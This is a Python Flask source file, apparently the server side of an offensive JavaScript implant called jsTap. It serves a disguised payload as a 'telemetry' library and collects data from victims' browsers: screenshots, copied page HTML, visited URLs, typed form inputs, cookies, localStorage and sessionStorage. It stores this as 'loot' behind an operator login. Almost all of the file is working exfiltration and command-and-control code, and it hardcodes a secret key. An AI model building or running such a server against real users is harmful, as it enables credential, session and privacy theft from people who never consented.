#!usr/bin/env python
from flask import Flask, jsonify, abort, make_response, g, request, render_template, redirect, url_for, send_from_directory, escape
from flask_cors import CORS
from flask_sqlalchemy import SQLAlchemy
from sqlalchemy import DateTime, func
from sqlalchemy_utils import database_exists
from flask_login import LoginManager, login_user, logout_user, UserMixin, login_required, current_user
from flask_bcrypt import Bcrypt
from enum import Enum
import magic
import json
import os
import time
import threading
import string
import random
import shutil




# Initialization stuff
app = Flask(__name__)
CORS(app)
baseDir = os.path.abspath(os.path.dirname(__file__))
app.config["SQLALCHEMY_DATABASE_URI"] = 'sqlite:///' + os.path.join(baseDir, 'jsTap.db')
app.config["SQLALCHEMY_TRACK_MODIFICATIONS"] = False
app.config['SECRET_KEY'] = 'b4CtXzlMp9tsATa3i7jgNiB10eiJbrQG'
# app.config['SECRET_KEY'] = ''.join(random.choices(string.ascii_uppercase + string.ascii_lowercase + string.digits, k=45))
app.config['SESSION_COOKIE_SECURE'] = True
app.config['SESSION_COOKIE_SAMESITE'] = 'Strict'
db = SQLAlchemy(app)
login_manager = LoginManager()
login_manager.login_view = 'login'
login_manager.init_app(app)
bcrypt = Bcrypt(app)


# *********************************************************************

def printHeader():
    print("""
                                        ▐▄▄▄.▄▄ ·                       
             .* ./,                      ·██▐█ ▀.                 
             ,    ,,,                  ▪▄ ██▄▀▀▀█▄                                            
            *     .,.*                 ▐▌▐█▌▐█▄▪▐█                                            
           ,*      ,. *.                ▀▀▀• ▀▀▀▀              .(/,#/            
           *        *  *,         .,,.                      ,#%&&&&#            
          ./        ,,  /.          ./#%%&&&&&&&&&&&&%#((//,  ,#%%#/*           
          *,        .*  .(,               ,/#%%&&&&&&&&&&&&&#,   ,   ,.         
          #,         *.  ,(                    .*#%&&&&&&&&&&&%#*     *         
         ,#          .,   /,                  ./(#(  ,*#%%&&&&&&&&(. ,.         
         ,/          .*   ,/                 *%%#(%%%%(   .*(%%%%%&#(,          
 ./*.  ../(,,*******/,/.  ,%/////.         .(*  ,%%%%/     */  ...,%%%%/.       
 *.                 *//   ,#     *.       /,          .***,(.,/    , ,(###*     
 ,,.*,,*/(##((/*/***///   (*....,(.     *,           .*/(%%%(,(*..*.      .*/.  
          #,     .,, /*  */..(*,      ,,       .,/(/,(%%&&&&&&&&%%%/.           
          **         /. ,/  ,,*,    ,,    ,//,       */%%%%%&&&&&&%%%#*         
          .(        */ .*  .*,, , .***,.             *(/%%%%%((#%%%%%%%%#*      
           /       .(,**  *.*,. .,                   *%((%%&%&(#&%&#%%&%%%%(,   
           */      /(/, .*.(.     ,*,               .#%%//%%%&(%&&&(%&&&&&&&&%* 
            (,    *%/.  ,.**... ,..(%%(,           .(%%%#*#%&#(&&%#/&&&&&&&&&&%#
            ./   ,(, ** ..  *,,/**%%&&&%%%#/,,..  *#%%%%* *%#*%&&%((&&&&&&&&&&&&
             ,/.*,    *%(.  .  , .*#%%%%%%%&&&&/(/#%%%#,  .##%&&&%/%&&&&&&&&&&&&
                     .((/,....         ,/##%%%%&&%&%%(.    *%&&&%/%&&&&&&&&&&&&&
                                     ▄▄▄▄▄ ▄▄▄·  ▄▄▄·
                                     •██  ▐█ ▀█ ▐█ ▄█  
                                      ▐█.▪▄█▀▀█  ██▀·  
                                      ▐█▌·▐█ ▪▐▌▐█▪·•  
                                      ▀▀▀  ▀  ▀ .▀   
                                    by ＠ｈｏｏｄｏｅｒ
        """)



#***************************************************************************
# Support Data
SessionDirectories = {}
SessionImages = {}
SessionHTML = {}
lootDirCounter = 1
threadLock = ""
databaseLock = ""


logFileName = "sessionLog.txt"



#***************************************************************************
# Database classes
class Client(db.Model):
    id        = db.Column(db.Integer, primary_key=True)
    nickname  = db.Column(db.String(100), unique=True, nullable=False)
    notes     = db.Column(db.Text)
    firstSeen = db.Column(db.DateTime(timezone=True),server_default=func.now())
    lastSeen  = db.Column(db.DateTime(timezone=True), onupdate=func.now())

    def update(self):
        self.lastSeen = func.now()

    def __repr__(self):
        return f'<Client {self.id}>'


# Keep screenshots as files on disk, just track the filename
class Screenshot(db.Model):
    id        = db.Column(db.Integer, primary_key=True)
    clientID  = db.Column(db.String(100), nullable=False)
    # url       = db.Column(db.String(100), nullable=False)
    timeStamp = db.Column(db.DateTime(timezone=True), server_default=func.now())
    fileName  = db.Column(db.String(100), nullable=False)
  
    def __repr__(self):
        return f'<Client {self.id}>'


class HtmlCode(db.Model):
    id        = db.Column(db.Integer, primary_key=True)
    clientID  = db.Column(db.String(100), nullable=False)
    url       = db.Column(db.String(100), nullable=False)
    timeStamp = db.Column(db.DateTime(timezone=True), server_default=func.now())
    code      = db.Column(db.Text)
    fileName  = db.Column(db.String(100), nullable=False)


    def __repr__(self):
        return f'<Client {self.id}>'


class UrlVisited(db.Model):
    id        = db.Column(db.Integer, primary_key=True)
    clientID  = db.Column(db.String(100), nullable=False)
    url       = db.Column(db.String(100), nullable=False)
    timeStamp = db.Column(db.DateTime(timezone=True), server_default=func.now())

    def __repr__(self):
        return f'<Client {self.id}>'


class UserInput(db.Model):
    id         = db.Column(db.Integer, primary_key=True)
    clientID   = db.Column(db.String(100), nullable=False)
    inputName  = db.Column(db.String(100), nullable=False)
    inputValue = db.Column(db.String(100), nullable=False)
    timeStamp  = db.Column(db.DateTime(timezone=True), server_default=func.now())

    def __repr__(self):
        return f'<Client {self.id}>'


class Cookie(db.Model):
    id          = db.Column(db.Integer, primary_key=True)
    clientID    = db.Column(db.String(100), nullable=False)
    cookieName  = db.Column(db.String(100), nullable=False)
    cookieValue = db.Column(db.String(100), nullable=False)
    timeStamp   = db.Column(db.DateTime(timezone=True), server_default=func.now())

    def __repr__(self):
        return f'<Client {self.id}>'


class LocalStorage(db.Model):
    id        = db.Column(db.Integer, primary_key=True)
    clientID  = db.Column(db.String(100), nullable=False)
    key       = db.Column(db.String(100), nullable=False)
    value     = db.Column(db.String(100), nullable=False)
    timeStamp = db.Column(db.DateTime(timezone=True), server_default=func.now())

    def __repr__(self):
        return f'<Client {self.id}>'


class SessionStorage(db.Model):
    id        = db.Column(db.Integer, primary_key=True)
    clientID  = db.Column(db.String(100), nullable=False)
    key       = db.Column(db.String(100), nullable=False)
    value     = db.Column(db.String(100), nullable=False)
    timeStamp = db.Column(db.DateTime(timezone=True), server_default=func.now())

    def __repr__(self):
        return f'<Client {self.id}>'


class Event(db.Model):
    id        = db.Column(db.Integer, primary_key=True)
    clientID  = db.Column(db.String(100), nullable=False)
    timeStamp = db.Column(db.DateTime(timezone=True))
    eventType = db.Column(db.String(100), nullable=False)
    eventID   = db.Column(db.Integer, nullable=False)

    def __repr__(self):
        return f'<Client {self.id}>'
   

# User C2 UI session
class User(UserMixin, db.Model):
    __table_name__ = 'user'
    username       = db.Column(db.String, primary_key=True)
    password       = db.Column(db.String, nullable=False)
    authenticated  = db.Column(db.Boolean, default=False)

    def is_active(self):
        # We don't need to deactivate user accounts, but
        # this is a required method
        return True

    def get_id(self):
        return self.username

    def is_authenticated(self):
        return self.authenticated

    def is_anonymous(self):
        # Another unused but required method
        return False


#***************************************************************************
# Support Functions



# Thread safe raw data logging
# Could put database stuff here...
def logEvent(identifier, logString):
    threadLock.acquire()
    # print("++ Start logEvent")
    lootPath = './loot/client_' + str(SessionDirectories[identifier])

    # We're going to append to the logfile
    sessionFile = open(lootPath + "/" + logFileName, "a")
    #print("In logEvent with time: " + str(time.localtime(time.time())))
    sessionFile.write(str(time.time()) + ": " + logString + "\n")
    sessionFile.close()
    threadLock.release()
    # print("-- End logEvent")

# Need function to check session, return download directory
def findLootDirectory(identifier):
    # Check if we know of this session and what it's 
    # loot directory is. 
    # If it's a new session we haven't seen before, create a new loot directory 
    # and return it to the caller. 

    global lootDirCounter

    threadLock.acquire()
    if identifier not in SessionDirectories.keys():

        print("New session for client: " + identifier)

        # Database Entry
        newClient = Client(nickname=identifier, notes='testNote')
        db.session.add(newClient)
        db.session.commit()

        # Initialize our storage
        SessionDirectories[identifier] = lootDirCounter
        lootDirCounter = lootDirCounter + 1
        lootPath = './loot/client_' + str(SessionDirectories[identifier])
        #print("Checking if loot dir exists: " + lootPath)

        if not os.path.exists(lootPath):
            #print("Creating directory...")
            os.mkdir(lootPath)
            sessionFile = open(lootPath + "/" + logFileName, "w")
            sessionFile.write("Session identifier: ")
            sessionFile.write(identifier + "\n")
            sessionFile.close()

            # Record the client index
            clientFile = open("./loot/clients.txt", "a")
            clientFile.write(str(time.time()) + ", " + identifier + ": " + lootPath + "\n")
            clientFile.close()
        # else:
        #     print("Loot directory already exists")

        # Initialize our number trackers
        SessionImages[identifier] = 1;
        SessionHTML[identifier] = 1;
    
    threadLock.release()


    lootDir = "client_" + str(SessionDirectories[identifier])
    #print("Loot directory is: " + lootDir)
    return lootDir



def dbCommit():
    databaseLock.acquire()
    db.session.commit()
    databaseLock.release()



# Updates "last seen" timestamp"
def clientSeen(identifier):
    # print("*** Starting clientSeen Update!")
    client = Client.query.filter_by(nickname=identifier).first()
    client.update()
    # print("--- Done client seen update...")



# Needed by flask-login
@login_manager.user_loader
def user_loader(username):
    # return User.query.get(username)
    return User.query.filter_by(username=username).first()


# Need an admin account
def addAdminUser():
    passwordLength = 45

    randomPassword = ''.join(random.choices(string.ascii_uppercase + string.ascii_lowercase 
        + string.digits, k=passwordLength))


    print("*******************************")
    print("WebApp admin creds:")
    print("admin : " + randomPassword)
    print("*******************************")

    adminUser = User(username='admin', password=bcrypt.generate_password_hash(randomPassword))

    db.session.add(adminUser)
    dbCommit()



#***************************************************************************
# Page Endpoints

# Send a copy of the payload
@app.route('/lib/telemlib.js', methods=['GET'])
def sendPayload():
    with open('./telemlib.js', 'rb') as file:
        payload = file.read()
        response = make_response(payload, 200)
        response.mimetype = 'text/javascript'

        return response


# Send copy of html2canvas library
@app.route('/lib/telemhelperlib.js', methods=['GET'])
def sendHtml2Canvas():
    with open('./html2canvas.min.js', 'rb') as file:
        payload = file.read()
        response = make_response(payload, 200)
        response.mimetype = 'text/javascript'

        return response


# Send c2 UI index page
@app.route('/', methods=['GET'])
@login_required
def sendIndex():
    with open('./index.html', 'r') as file:
        index = file.read()
        response = make_response(index, 200)
        #response.mimetype('text/html')

        return response



# Serve up loot files
# for images and HTML code
@app.route('/loot/<path:path>')
@login_required
def sendLootFile(path):

    # If HTML the user needs to download it the loot file, not render it
    # Rendering the HTML copy in the browswer will likely hit the target server
    # with CSS/JavaScript requests from our browser. No good. 
    if "htmlCopy.html" in path:
        # print("### We're serving up stolent HTML!")
        return send_from_directory('loot', path, as_attachment=True)
    else:
        # Just display the screenshot in the browser, this is safe
        # print("#### Serving up screenshot!")    
        return send_from_directory('loot', path)



@app.route('/login', methods=['POST', 'GET'])
def login():
    print("Top of login...")

    if request.method == 'GET':
        print("** Handling login GET...")
        with open('./login.html', 'r') as file:
            loginForm = file.read()
            response = make_response(loginForm, 200)
            #response.mimetype('text/html')

            return response


    if request.method == 'POST':
        print("** Handling login POST...")
        username = request.form['username']
        password = request.form['password']

        user = User.query.filter_by(username=username).first()

        if user:
            isValidPassword = bcrypt.check_password_hash(user.password, password) 

            if isValidPassword:
                print("Password matched!")
                login_user(user)
                return redirect(url_for('sendIndex'))
                # response = make_response("Successful login.", 200)
                # return response
            else:
                print("Auth: Password didn't match")
                response = make_response("No.", 401)
                return response
                rint("Password didn't match :(")
        else:
            # Make sure equal processing time, avoiding time based user enum
            hash = bcrypt.generate_password_hash(password)

            print("Auth: User not found")
            response = make_response("No.", 401)
            return response



@app.route('/logout', methods=['GET'])
def logout():
    logout_user()
    return redirect("login")


#***************************************************************************
# Loot API endpoints

# Capture screenshot
@app.route('/loot/screenshot/<identifier>', methods=['POST'])
def recordScreenshot(identifier):
    # print("Received image from: " + identifier)
    #print("Looking up loot dir...")
    lootDir = findLootDirectory(identifier)
    image = request.data
    file_type = magic.from_buffer(image, mime=True)

    # Make sure the html2canvas screenshot is 
    # what we're expecting. Definitely don't want SVGs
    if file_type != 'image/png':
        # Shenanigans from the 'client' are afoot
        return "No.", 401

    if identifier in SessionImages.keys():
        imageNumber = SessionImages[identifier]
        #print("Using image number: " + str(imageNumber))
        SessionImages[identifier] = imageNumber + 1
    else:
        raise RuntimeError("Session image counter not found")
        quit()

    #print("Writing the file to disk...")
    with open ("./loot/" + lootDir + "/" + str(imageNumber) + "_Screenshot.png", "wb") as binary_file:
        logEvent(identifier, "Screenshot: " + str(imageNumber) + "_Screenshot.png")
        binary_file.write(image)
        binary_file.close()

    # Put it in the DB
    newScreenshot = Screenshot(clientID=identifier, fileName="./loot/" + lootDir + "/" + str(imageNumber) + "_Screenshot.png")
    db.session.add(newScreenshot)
    clientSeen(identifier)
    dbCommit()

    # add to global event table
    db.session.refresh(newScreenshot)
    newEvent = Event(clientID=identifier, timeStamp=newScreenshot.timeStamp, 
    eventType='SCREENSHOT', eventID=newScreenshot.id)
    db.session.add(newEvent)
    dbCommit()



    return "ok", 200



# Capture the HTML seen
@app.route('/loot/html/<identifier>', methods=['POST'])
def recordHTML(identifier):
    # print("Got HTML from: " + identifier)
    lootDir = findLootDirectory(identifier)
    content = request.json 
    url = content['url']
    trapHTML = content['html']


    if identifier in SessionHTML.keys():
        htmlNumber = SessionHTML[identifier]
        SessionHTML[identifier] = htmlNumber + 1
    else:
        raise RuntimeError("Session HTML counter not found")
        quit()

    lootFile = "./loot/" + lootDir + "/" + str(htmlNumber) + "_htmlCopy.html"

    with open (lootFile, "w") as html_file:
        logEvent(identifier, "HTML Copy: " + str(htmlNumber) + "_htmlCopy.html")
        html_file.write(trapHTML)
        html_file.close()


    # Put it in the DB
    newHtml = HtmlCode(clientID=identifier, url=content['url'], 
        code=content['html'], fileName = lootFile)
    db.session.add(newHtml)
    clientSeen(identifier)
    dbCommit()

    # add to global event table
    db.session.refresh(newHtml)
    newEvent = Event(clientID=identifier, timeStamp=newHtml.timeStamp, 
        eventType='HTML', eventID=newHtml.id)
    db.session.add(newEvent)
    dbCommit()


    return "ok", 200




# Record new URL visited in trap
@app.route('/loot/location/<identifier>', methods=['POST'])
def recordUrl(identifier):
    # print("New URL recorded from: " + identifier)
    lootDir = findLootDirectory(identifier)
    content = request.json
    url = content['url']
    # print("Got URL: " + url)
    logEvent(identifier, "URL Visited: " + url)


    # Put it in the DB
    newUrl = UrlVisited(clientID=identifier, url=content['url'])
    db.session.add(newUrl)
    clientSeen(identifier)
    dbCommit()

    # add to global event table
    db.session.refresh(newUrl)
    newEvent = Event(clientID=identifier, timeStamp=newUrl.timeStamp, 
    eventType='URLVISITED', eventID=newUrl.id)
    db.session.add(newEvent)
    dbCommit()

    return "ok", 200




# Record user inputs
@app.route('/loot/input/<identifier>', methods=['POST'])
def recordInput(identifier):
    # print("New input recorded from: " + identifier)
    lootDir = findLootDirectory(identifier)
    content = request.json
    inputName = content['inputName']
    inputValue = content['inputValue']
    # print("Got input: " + inputName + ", value: " + inputValue)
    logEvent(identifier, "User input field: " + inputName + ", value: " + inputValue)


    # Put it in the DB
    newInput = UserInput(clientID=identifier, inputName=content['inputName'], inputValue=content['inputValue'])
    db.session.add(newInput)
    clientSeen(identifier)
    dbCommit()

    # add to global event table
    db.session.refresh(newInput)
    newEvent = Event(clientID=identifier, timeStamp=newInput.timeStamp, 
    eventType='USERINPUT', eventID=newInput.id)
    db.session.add(newEvent)
    dbCommit()    

    return "ok", 200



# Record whatever cookies we can get our hands on
# Note that any httpOnly flagged cookies we won't get
# which would probably include any session cookies. Probably. 
@app.route('/loot/dessert/<identifier>', methods=['POST'])
def recordCookie(identifier):
    # print("New cookie recorded from: " + identifier)
    lootDir = findLootDirectory(identifier)
    content = request.json
    # print("**** New cookie report: " + content)
    cookieName = content['cookieName']
    cookieValue = content['cookieValue']
    logEvent(identifier, "Cookie Name: " + cookieName + ", value: " + cookieValue)


    # Put it in the DB
    newCookie = Cookie(clientID=identifier, cookieName=cookieName, cookieValue=cookieValue)
    db.session.add(newCookie)
    clientSeen(identifier)
    dbCommit()

    # add to global event table
    db.session.refresh(newCookie)
    newEvent = Event(clientID=identifier, timeStamp=newCookie.timeStamp, 
    eventType='COOKIE', eventID=newCookie.id)
    db.session.add(newEvent)
    dbCommit()    

    return "ok", 200



# Record local storage data bits
@app.route('/loot/localstore/<identifier>', methods=['POST'])
def recordLocalStorageEntry(identifier):
    # print("New localStorage data recorded from: " + identifier)
    lootDir = findLootDirectory(identifier)
    content = request.json
    localStorageKey = content['key']
    localStorageValue = content['value']
    logEvent(identifier, "Local Storage Entry: " + localStorageKey + ", value: " + localStorageValue)


    # Put it in the DB
    newLocalStorage = LocalStorage(clientID=identifier, key=localStorageKey, value=localStorageValue)
    db.session.add(newLocalStorage)
    clientSeen(identifier)
    dbCommit()

    # add to global event table
    db.session.refresh(newLocalStorage)
    newEvent = Event(clientID=identifier, timeStamp=newLocalStorage.timeStamp, 
    eventType='LOCALSTORAGE', eventID=newLocalStorage.id)
    db.session.add(newEvent)
    dbCommit()    

    return "ok", 200



# Record session storage data bits
@app.route('/loot/sessionstore/<identifier>', methods=['POST'])
def recordSessionStorageEntry(identifier):
    # print("New sessionStorage data recorded from: " + identifier)
    lootDir = findLootDirectory(identifier)
    content = request.json 
    sessionStorageKey = content['key']
    sessionStorageValue = content['value']
    logEvent(identifier, "Session Storage Entry: " + sessionStorageKey + ", value: " + sessionStorageValue)

    # Put it in the DB
    newSessionStorage = SessionStorage(clientID=identifier, key=sessionStorageKey, value=sessionStorageValue)
    db.session.add(newSessionStorage)
    clientSeen(identifier)
    dbCommit()


    # add to global event table
    db.session.refresh(newSessionStorage)
    newEvent = Event(clientID=identifier, timeStamp=newSessionStorage.timeStamp, 
    eventType='SESSIONSTORAGE', eventID=newSessionStorage.id)
    db.session.add(newEvent)
    dbCommit()    

    return "ok", 200



#***************************************************************************
# UI API Endpoints


# Get clients list
@app.route('/api/getClients', methods=['GET'])
@login_required
def getClients():
    clients = Client.query.all()

    allClients = [{'id':escape(client.id), 'nickname':escape(client.nickname), 'notes':escape(client.notes), 
        'firstSeen':client.firstSeen, 'lastSeen':client.lastSeen} for client in clients]

    return jsonify(allClients)




@app.route('/api/clientEvents/<id>', methods=['GET'])
@login_required
def getClientEvents(id):
    print("Retrieving events table for client: " + id)
    client = Client.query.filter_by(id=id).first()
    clientName = client.nickname;

    events = Event.query.filter_by(clientID=clientName)

    eventData = [{'id':escape(event.id), 'timeStamp':event.timeStamp, 
        'eventType':escape(event.eventType), 'eventID':escape(event.eventID)} for event in events]

    return jsonify(eventData)

    

@app.route('/api/clientScreenshot/<key>', methods=['GET'])
@login_required
def getClientScreenshots(key):
    screenshot = Screenshot.query.filter_by(id=key).first()

    screenshotData = {'fileName':escape(screenshot.fileName)}
    

    return jsonify(screenshotData)



@app.route('/api/clientHtml/<key>', methods=['GET'])
@login_required
def getClientHtml(key):
    htmlCode = HtmlCode.query.filter_by(id=key).first()

    # htmlData = {'url':htmlCode.url, 'code':escape(htmlCode.code)}

    # This one shouldn't be escaped
    htmlData = {'url':htmlCode.url, 'code':htmlCode.code, 'fileName':htmlCode.fileName}
    

    return jsonify(htmlData)



@app.route('/api/clientUrl/<key>', methods=['GET'])
@login_required
def getClientUrls(key):
    urlsVisited = UrlVisited.query.filter_by(id=key).first()

    urlData = {'url':escape(urlsVisited.url)}
    

    return jsonify(urlData)



@app.route('/api/clientUserInput/<key>', methods=['GET'])
@login_required
def getClientUserInputs(key):
    userInput = UserInput.query.filter_by(id=key).first()

    userInputData = {'inputName':escape(userInput.inputName), 'inputValue':escape(userInput.inputValue)}
    

    return jsonify(userInputData)



@app.route('/api/clientCookie/<key>', methods=['GET'])
@login_required
def getClientCookies(key):
    print("*** In cookie lookup, key is: " + key)
    cookie = Cookie.query.filter_by(id=key).first()

    cookieData = {'cookieName':escape(cookie.cookieName), 'cookieValue':escape(cookie.cookieValue)}
    

    return jsonify(cookieData)





@app.route('/api/clientLocalStorage/<key>', methods=['GET'])
@login_required
def getClientLocalStorage(key):
    print("**** Fetching client local storage...")
    localStorage = LocalStorage.query.filter_by(id=key).first()
    print("Sending back: " + localStorage.key + ":" + localStorage.value)
    
    localStorageData = {'localStorageKey':escape(localStorage.key), 'localStorageValue':escape(localStorage.value)}
    

    return jsonify(localStorageData)




@app.route('/api/clientSessionStorage/<key>', methods=['GET'])
@login_required
def getClientSesssionStorage(key):
    sessionStorage = SessionStorage.query.filter_by(id=key).first()
    
    sessionStorageData = {'sessionStorageKey':escape(sessionStorage.key), 'sessionStorageValue':escape(sessionStorage.value)}
    

    return jsonify(sessionStorageData)


#**************************************************************************



if __name__ == '__main__':
    printHeader()

    # Initilize our locks
    threadLock   = threading.Lock()
    databaseLock = threading.Lock()


    # Check for existing database file
    if database_exists('sqlite:///' + os.path.join(baseDir, 'jsTap.db')):
        with app.app_context():
            print("!! SQLite database already exists:")
            clients = Client.query.all()
            numClients = len(clients)

            users = User.query.all()
            numUsers = len(users)

            print("Existing database has " + str(numClients) + " clients and " 
                + str(numUsers) + " users.")

            if numUsers != 0:
                print("Make selection on how to handle existing users:")
                print("1 - Keep existing users")
                print("2 - Delete all users and generate new admin account")

                val = int(input("\nSelection: "))
                if val == 2:
                    print("Generating new admin account")
                    User.__table__.drop(db.engine)
                    dbCommit()

                    db.create_all()

                    addAdminUser()
                elif val == 1:
                    print("Keeping existing users.")
                else:
                    print("Invalid selection.")
                    exit()


            if numClients != 0:
                print("Make selection on how to handle existing clients:")
                print("1 - Keep existing client data")
                print("2 - Delete all client data and start fresh")


                val = int(input("\nSelection: "))
                if val == 2:
                    print("Clearing client data")
                    Client.__table__.drop(db.engine)
                    Screenshot.__table__.drop(db.engine)
                    HtmlCode.__table__.drop(db.engine)
                    UrlVisited.__table__.drop(db.engine)
                    UserInput.__table__.drop(db.engine)
                    Cookie.__table__.drop(db.engine)
                    LocalStorage.__table__.drop(db.engine)
                    SessionStorage.__table__.drop(db.engine)
                    dbCommit()

                    db.create_all()
                    shutil.rmtree("./loot")
                elif val == 1:
                    print("Keeping existing client data.")
                else:
                    print("Invalid selection.")
                    exit()


    else:
        print("No database found")
        print("... creating database...")
        with app.app_context():
            db.drop_all()
            db.create_all()
            shutil.rmtree("./loot")
            addAdminUser()


    with app.app_context():
        db.session.configure(autoflush=False)


    # Check for loot directory
    if not os.path.exists("./loot"):
        os.mkdir("./loot")

    app.run(debug=False, host='0.0.0.0', port=8444, ssl_context='adhoc')
